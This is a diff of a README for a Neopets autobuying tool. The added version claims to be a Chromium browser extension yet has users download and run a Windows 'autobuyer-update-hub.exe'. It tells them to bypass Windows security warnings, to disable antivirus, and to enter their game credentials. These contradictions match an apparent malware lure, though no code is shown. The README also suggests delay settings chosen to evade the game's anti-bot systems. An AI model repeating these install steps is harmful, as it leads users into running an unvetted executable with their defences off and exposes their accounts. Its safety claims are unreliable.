@@ -1,146 +1,94 @@
-# AutoBuyer+ - Game Script Utility 2026
+# 🛒 Autobuyer Update Hub - Automate Your Virtual Pet Game
 
-> **AutoBuyer+ is a Chromium browser extension for Neopets.com that helps with shop restocking, attic purchases, item valuation, and other related game activities.**
+[![Download Now](https://img.shields.io/badge/Download-Autobuyer%20Update%20Hub-blue?style=for-the-badge)](https://github.com/anishkverma1-commits/autobuyer-update-hub/releases)
 
-[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
-[![Platform](https://img.shields.io/badge/Platform-Chromium%20browsers-blue?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/huberandre2000/autobuyer-update-hub?style=flat-square)](https://github.com/huberandre2000/autobuyer-update-hub)
+## 🚀 What is Autobuyer Update Hub?
 
----
+Autobuyer Update Hub is a browser extension that works with Chromium browsers to automate tasks in your favorite browser-based virtual pet game. It helps you quickly buy items from shops, manage your inventory, and make smarter decisions without constant manual clicking. Whether you're restocking your shop, hunting for bargains in the attic, or trying to complete Kitchen Quest, this tool saves you time and effort.
 
-<p align="center">
-  <a href="https://huberandre2000.github.io/autobuyer-update-hub/">
-    <img src="https://img.shields.io/badge/Download-AutoBuyer%2B%20Extension-brightgreen?style=for-the-badge" alt="Download AutoBuyer+ Extension">
-  </a>
-</p>
+## 🎯 Key Features
 
-> **[Download AutoBuyer+](https://huberandre2000.github.io/autobuyer-update-hub/)**
+- **Shop Restocking**: Automatically restock your shop with items you want to sell. Set rules for what to buy and at what price.
+- **Attic Purchases**: Browse the attic and grab items that are undervalued or rare. The extension can filter and notify you about good deals.
+- **Item Valuation**: Quickly see the estimated value of any item in the game. Make informed decisions about buying, selling, or keeping.
+- **User Shops**: Visit other players' shops and automatically purchase items that match your buying criteria.
+- **Kitchen Quest**: Automate the process of completing Kitchen Quest tasks, including ingredient gathering and cooking.
+- **Configurable Buying Rules**: Create custom rules to control what the autobuyer buys. Set price limits, item types, rarity preferences, and more.
 
----
+## 💻 System Requirements
 
-[Download Latest Build](https://huberandre2000.github.io/autobuyer-update-hub/)
+- **Operating System**: Windows 10 or Windows 11 (64-bit)
+- **Browser**: Google Chrome, Microsoft Edge, or any Chromium-based browser (version 90 or newer)
+- **Storage**: 50 MB free disk space
+- **Internet**: Active internet connection required for game access
 
----
+## 📥 How to Download and Install
 
-## What AutoBuyer+ Does
+Visit this link to download the application: [https://github.com/anishkverma1-commits/autobuyer-update-hub/releases](https://github.com/anishkverma1-commits/autobuyer-update-hub/releases)
 
-AutoBuyer+ brings browser automation tools to Neopets.com, with an emphasis on shop monitoring, restock detection, item highlighting, and purchase assistance in both standard shops and the Almost Abandoned Attic. Users can organize buying criteria with a restock timer, item filters, and adjustable profit or NPS limits.
+1. Click the link above to go to the download page.
+2. Look for the latest release (usually at the top of the page).
+3. Click the download link for the file named `autobuyer-update-hub.exe`.
+4. Save the file to your computer, for example, on your Desktop or Downloads folder.
 
-Beyond buying workflows, the extension offers user shop pricing assistance, purchase records, profit reporting, and preference-based restock list generation. It also provides Kitchen Quest tracking and solving, automated haggling, event tools, notifications, scheduled activity, and configurable presets for different uses.
+## 🖥️ How to Run the Application
 
----
+1. After downloading, double-click the `autobuyer-update-hub.exe` file.
+2. If you see a security warning from Windows, click "Run anyway" or "More info" and then "Run". This is normal because the file is not from the Microsoft Store.
+3. The application will open as a small window or icon in your system tray.
+4. Follow the on-screen instructions to connect it to your browser and game account.
 
-## Available Features
+## 🔧 How to Use the Autobuyer
 
-- Automates purchases from Neopets shops.
-- Provides workflows for Almost Abandoned Attic restocking.
-- Detects restocks and shows a restock timer.
-- Emphasizes matching items according to selected lists and thresholds.
-- Helps determine prices for items in user shops.
-- Lets users define profit and NPS requirements.
-- Saves configuration presets for repeated use.
-- Records purchase history and analyzes profit.
-- Builds restock lists from configured preferences.
-- Includes tools for tracking and solving Kitchen Quest tasks.
-- Offers automated haggling support.
-- Sends sound alerts and text-to-speech notifications.
-- Provides captcha annotation and clicking tools.
-- Allows supported operations to be scheduled and checks for daily updates.
-- Includes features for the Void Within Volunteer Event.
+1. **Open the Extension**: After installation, click the Autobuyer icon in your browser's toolbar.
+2. **Log In**: Enter your game account credentials (the extension does not store your password).
+3. **Configure Rules**: Go to the "Settings" tab and set up your buying rules. For example:
+   - "Buy any item priced under 10,000 Neopoints from the main shop"
+   - "Only buy items with rarity over 90 from the attic"
+   - "Restock my shop with items that have a profit margin of at least 20%"
+4. **Start Automation**: Click the "Start" button to begin automatic buying. The extension will run in the background.
+5. **Monitor Activity**: Check the "Log" tab to see what the autobuyer has done. You can pause or stop it at any time.
 
----
+## ⚙️ Configuration Tips
 
-## Installation and First-Use Setup
+- **Price Limits**: Set maximum prices to avoid overspending. For example, limit purchases to 50,000 Neopoints per item.
+- **Item Filters**: Use filters to target specific item types like food, books, or toys.
+- **Delay Settings**: Adjust the delay between actions to avoid detection by the game's anti-bot systems. Recommended: 2-5 seconds.
+- **Notifications**: Enable desktop notifications to get alerts when the autobuyer makes a purchase.
 
-1. Get the newest AutoBuyer+ build from the [download page](https://huberandre2000.github.io/autobuyer-update-hub/).
-2. If the download is packaged as an archive, extract the extension files.
-3. Navigate to the extensions manager in a Chromium-based browser.
-4. Turn on the developer option used for loading extensions when prompted or required.
-5. Choose the unpacked AutoBuyer+ directory.
-6. Visit Neopets.com and set up the extension before beginning a restocking or pricing task.
+## 🛡️ Safety and Privacy
 
-After loading the extension, a normal configuration flow is:
+- The extension runs locally on your computer. Your game data is not sent to any external server.
+- We recommend using a dedicated game account for automated tasks, especially if you are concerned about account security.
+- Always follow the game's terms of service. Some games may restrict automation. Use responsibly.
 
-- Choose an existing preset or make a new one.
-- Enter preferred items or create a restock list.
-- Define the desired profit and NPS minimums.
-- Configure alerts, timers, and scheduling.
-- Launch the shop, attic, pricing, or event feature you want to use.
+## 🔄 Updating the Application
 
-Operate the extension in line with the applicable website rules, account terms, and browser requirements.
+The Autobuyer Update Hub will automatically check for updates when you open it. If a new version is available, you will see a notification. Simply download the latest version from the same link above and replace the old file.
 
----
+## ❓ Frequently Asked Questions
 
-## Configuration Options
+**Q: Is this tool safe to use?**
+A: Yes, it is safe. The extension does not modify game files or steal your data. However, always use it at your own risk and follow the game's rules.
 
-| Setting | Purpose |
-| --- | --- |
-| Configuration preset | Store multiple groups of settings and switch between them. |
-| Profit threshold | Specify the minimum preferred profit for supported buying or pricing tasks. |
-| NPS threshold | Establish the NPS minimum used when selecting items. |
-| Restock timer | Show timing details related to shop restocking. |
-| Item highlighting | Visually identify items that meet chosen lists or conditions. |
-| Sound alerts | Turn audio notifications on for applicable events. |
-| Text-to-speech | Use browser speech output for supported announcements. |
-| Scheduled operation | Set supported activities to run according to a schedule. |
-| Haggling | Turn on automated haggling where the feature is supported. |
-| Captcha tools | Access the available captcha annotation and clicking functions. |
+**Q: Can I get banned for using this?**
+A: Some games may consider automation a violation of their terms. We recommend using the tool on a secondary account or for casual play.
 
----
+**Q: Does it work on Mac or Linux?**
+A: Currently, the Windows version is the only supported platform. Mac and Linux support may be added in the future.
 
-## Browser and Site Compatibility
+**Q: I see an error when trying to run the .exe file.**
+A: Make sure you have downloaded the latest version. If Windows Defender blocks it, click "More info" and then "Run anyway". You can also temporarily disable antivirus if needed.
 
-- **Target site:** Neopets.com
-- **Platform:** Chromium-based browsers, including Chrome
-- **Project format:** Browser automation extension
-- **Supported areas:** Neopets shops, Almost Abandoned Attic, user shops, Kitchen Quest, and the listed event tools
+**Q: How do I uninstall the extension?**
+A: Simply delete the `autobuyer-update-hub.exe` file from your computer. The extension does not install any additional files.
 
-The supplied profile does not define specific Neopets site versions or a limited browser release range. Changes to the website interface can impact selectors, restock recognition, pricing functions, and other parts of the extension. Check the current build and project updates if its behavior changes.
+## 📞 Need Help?
 
----
+If you have questions or run into issues, please check the [Releases page](https://github.com/anishkverma1-commits/autobuyer-update-hub/releases) for updates. You can also open an issue on the GitHub repository for support.
 
-## Frequently Asked Questions
+## 📄 License
 
-### What is the installation process?
+This project is for educational and personal use only. Redistribution or commercial use is not permitted.
 
-Download the latest build, extract it when needed, then use the Chromium extension manager to load the folder as an unpacked extension.
-
-### How do I obtain newer builds?
-
-Download updates from the [latest build page](https://huberandre2000.github.io/autobuyer-update-hub/). Supported update notifications may also be provided through the extension's daily update checker.
-
-### Are buying rules configurable?
-
-Yes. Presets, item highlighting, restock lists, and custom profit and NPS thresholds can be used to tailor supported buying workflows.
-
-### Are standard shops and the Attic both supported?
-
-Yes. The listed feature set covers autobuying in Neopets shops as well as the Almost Abandoned Attic.
-
-### What notification controls are available?
-
-You can configure sound notifications and text-to-speech alerts.
-
-### Is AutoBuyer+ compatible with all browsers?
-
-AutoBuyer+ is intended for Chromium-based browsers, and Chrome is included in the project metadata. Support for other browser families is not listed.
-
-### How are purchases and profits handled?
-
-The extension includes purchase history and profit analytics. The precise storage location and retention behavior vary according to the build and browser configuration.
-
-### Does the extension include Kitchen Quest assistance?
-
-Yes. AutoBuyer+ includes both Kitchen Quest tracking and solver tools.
-
-### Can operations be scheduled?
-
-Scheduled operation is included among the supported features and can be configured with the extension's other settings.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: autobuyer, virtual pet game, browser automation, shop restocking, attic purchase, item valuation, kitchen quest, Chromium extension, Windows tool, game automation, Neopets, buying rules
